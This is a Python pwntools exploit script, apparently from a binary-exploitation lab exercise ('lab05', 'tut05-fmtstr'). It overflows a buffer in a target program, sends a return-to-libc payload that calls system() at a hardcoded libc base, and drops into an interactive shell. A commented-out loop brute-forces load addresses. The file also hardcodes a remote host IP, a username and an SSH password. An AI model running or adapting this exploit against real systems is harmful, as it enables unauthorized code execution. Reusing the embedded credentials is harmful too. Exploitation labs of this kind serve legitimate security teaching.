#!/usr/bin/env python2

import os
import re
import sys

from pwn import *

context.arch = "x86"
context.bits = 32
debug = False
exe = "./target"

ip = '52.201.10.159'
user = 'lab05'
myPassword = '9a6d5757'
p = ''

if args['JAKE']:
    debug = True

if args['REMOTE']:
    s = ssh(user, ip, password=myPassword)
    p = s.process(exe, cwd='/home/lab05/tut05-fmtstr')

if args['LOCAL']:
    # Run shit
    p = process(exe)

def writeToFile(payload):
    # Write shellcode to a binary
    f = open('shellcode', 'w')
    f.write(payload)
    f.close()

# The garbage to fill the buffer
padding = 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaac'

libc = ELF("./libc.so.6")
sysAddr = libc.symbols['system']
offset = 0xf7de5000
shellcode = p32(offset + 0x001730cf) + p32(offset + 0x001730cf)
payload = padding + p32(offset + sysAddr) + shellcode

p = process(exe)
p.sendline(payload)
p.interactive()
'''
for i in range(0, 16):
    o1 = 0x56500000 | i << 16
    for j in range(0, 16):
        o2 = 0x56500000 | j << 12
        offset = o1 | o2
        payload = padding + p32(offset + sysAddr)
        #log.success('Payload ' + payload)
        print hex(offset)

        p = process(exe)
        p.sendline(payload)
        print p.recvall()
        p.close()
'''
